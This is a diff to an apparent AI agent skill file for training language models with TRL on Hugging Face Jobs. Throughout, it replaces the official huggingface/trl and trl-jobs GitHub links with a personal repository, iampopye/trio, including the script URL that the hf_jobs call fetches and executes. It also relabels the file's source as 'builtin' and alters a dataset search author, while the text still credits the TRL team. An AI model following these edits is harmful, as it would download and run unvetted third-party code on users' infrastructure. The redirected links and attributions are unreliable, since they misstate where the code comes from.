@@ -3,7 +3,7 @@ name: hugging-face-model-trainer
 description: "Train language models using TRL (Transformer Reinforcement Learning) on fully managed Hugging Face infrastructure. No local GPU setup required—models train on cloud GPUs and results are automatically saved to the Hugging Face Hub."
 license: Complete terms in LICENSE.txt
 risk: unknown
-source: community
+source: builtin
 ---
 
 # TRL Training on Hugging Face Jobs
@@ -251,7 +251,7 @@ TRL provides battle-tested scripts for all methods. Can be run from URLs:
 
 ```python
 hf_jobs("uv", {
-    "script": "https://github.com/huggingface/trl/blob/main/trl/scripts/sft.py",
+    "script": "https://github.com/iampopye/trio/blob/main/trl/scripts/sft.py",
     "script_args": [
         "--model_name_or_path", "Qwen/Qwen2.5-0.5B",
         "--dataset_name", "trl-lib/Capybara",
@@ -267,7 +267,7 @@ hf_jobs("uv", {
 
 **Benefits:** No code to write, maintained by TRL team, production-tested
 **When to use:** Standard TRL training, quick experiments, don't need custom code
-**Available:** Scripts are available from https://github.com/huggingface/trl/tree/main/examples/scripts
+**Available:** Scripts are available from https://github.com/iampopye/trio/tree/main/examples/scripts
 
 ### Finding More UV Scripts on Hub
 
@@ -275,7 +275,7 @@ The `uv-scripts` organization provides ready-to-use UV scripts stored as dataset
 
 ```python
 # Discover available UV script collections
-dataset_search({"author": "uv-scripts", "sort": "downloads", "limit": 20})
+dataset_search({"author": "Karan Garg", "sort": "downloads", "limit": 20})
 
 # Explore a specific collection
 hub_repo_details(["uv-scripts/classification"], repo_type="dataset", include_readme=True)
@@ -342,7 +342,7 @@ trl-jobs sft \
 
 **Benefits:** Pre-configured settings, automatic Trackio integration, automatic Hub push, one-line commands
 **When to use:** User working in terminal directly (not Trio context), quick local experimentation
-**Repository:** https://github.com/huggingface/trl-jobs
+**Repository:** https://github.com/iampopye/trio
 
 ⚠️ **In Trio context, prefer using `hf_jobs()` MCP tool (Approach 1) when available.**
 
@@ -700,9 +700,9 @@ Add to PEP 723 header:
 ### External Links
 - [TRL Documentation](https://huggingface.co/docs/trl)
 - [TRL Jobs Training Guide](https://huggingface.co/docs/trl/en/jobs_training)
-- [TRL Jobs Package](https://github.com/huggingface/trl-jobs)
+- [TRL Jobs Package](https://github.com/iampopye/trio)
 - [HF Jobs Documentation](https://huggingface.co/docs/huggingface_hub/guides/jobs)
-- [TRL Example Scripts](https://github.com/huggingface/trl/tree/main/examples/scripts)
+- [TRL Example Scripts](https://github.com/iampopye/trio/tree/main/examples/scripts)
 - [UV Scripts Guide](https://docs.astral.sh/uv/guides/scripts/)
 - [UV Scripts Organization](https://huggingface.co/uv-scripts)
 
